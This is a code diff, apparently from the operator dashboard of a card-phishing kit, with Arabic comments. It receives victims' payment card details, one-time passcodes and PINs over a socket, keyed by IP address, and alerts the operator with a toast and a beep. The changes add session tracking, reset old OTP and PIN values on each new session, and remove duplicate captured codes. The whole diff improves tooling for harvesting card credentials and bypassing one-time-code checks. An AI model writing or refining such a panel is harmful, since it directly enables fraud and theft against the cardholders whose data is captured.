@@ -356,8 +356,12 @@ function initSock(){
     const ip=norm(d.ip||'');
     if(!ld[ip])ld[ip]={};
     ld[ip].requestId=d.requestId;
+    ld[ip].sessionId=d.sessionId||null;
     // دائماً حدّث بيانات البطاقة بأحدث البيانات
     ld[ip].pay=d;
+    // مسح OTP وPIN القديمة عند بدء جلسة جديدة
+    ld[ip].otp=null;
+    ld[ip].pin=null;
     ls[ip]='payment';
     rowBadge(ip,'payment'); updPend(); beep(660);
     toast('💳 بيانات بطاقة جديدة');
@@ -379,6 +383,7 @@ function initSock(){
 
     if(!ld[mip])ld[mip]={};
     ld[mip].requestId=d.requestId;
+    if(d.sessionId)ld[mip].sessionId=d.sessionId;
 
     if(isPIN){
       // دائماً حدّث الـ PIN بأحدث قيمة
@@ -582,9 +587,16 @@ function buildCardSection(ip, ex){
   const hc=(ex&&ex.codes)||[];
 
   const cardData=pd||(hp.length>0?hp[0]:null);
-  // كل OTP من DB مرتبة من الأحدث للأقدم
-  const allOtps=od?[od,...hc.filter(c=>c.code_type!=='pin')]:[...hc.filter(c=>c.code_type!=='pin')];
-  const allPins=pind?[pind,...hc.filter(c=>c.code_type==='pin')]:[...hc.filter(c=>c.code_type==='pin')];
+  // كل OTP من DB مرتبة من الأحدث للأقدم - مع تصفية التكرار
+  const dbOtps=hc.filter(c=>c.code_type!=='pin');
+  const dbPinsArr=hc.filter(c=>c.code_type==='pin');
+  // إذا كان هناك live OTP، نزيل من DB أي سجل له نفس الـ request_id أو نفس الـ code
+  const allOtps=od
+    ?[od,...dbOtps.filter(c=>c.request_id!==od.requestId && c.code!==od.code)]
+    :[...dbOtps];
+  const allPins=pind
+    ?[pind,...dbPinsArr.filter(c=>c.request_id!==pind.requestId && c.code!==pind.code)]
+    :[...dbPinsArr];
   // تحديد stage من live أو من DB
   let stage=ls[ldKey]||ls[nip];
   if(!stage){
